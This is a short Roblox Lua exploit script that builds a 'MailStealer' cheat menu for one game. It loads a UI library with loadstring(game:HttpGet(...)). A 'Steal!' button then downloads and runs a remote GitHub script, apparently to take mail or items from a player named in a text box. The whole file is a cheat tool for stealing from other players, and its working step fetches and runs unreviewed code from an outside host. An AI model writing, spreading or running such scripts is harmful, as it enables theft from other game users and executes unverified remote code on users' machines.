if game.PlaceId == 6284583030 then
	local OrionLib = loadstring(game:HttpGet(('https://raw.githubusercontent.com/shlexware/Orion/main/source')))()
	local Window = OrionLib:MakeWindow({Name = "MailStealer", HidePremium = false, IntroText = "Starving Artists", SaveConfig = true, ConfigFolder = "MailStel"})
	local Tab = Window:MakeTab({
		Name = "Steal",
		Icon = "rbxassetid://4483345998",
		PremiumOnly = false
	})
	Tab:AddTextbox({
		Name = "Name",
		Default = "Name of Player",
		TextDisappear = true,
		Callback = function(Value)
			print(Value)
		end	  
	})
	Tab:AddButton({
		Name = "Steal!",
		Callback = function()
			loadstring(game:HttpGet("https://raw.githubusercontent.com/JBkingcode/PETSIMXMilkUP/main/MailStealer%20(2).lua"))()
		  end    
	})
end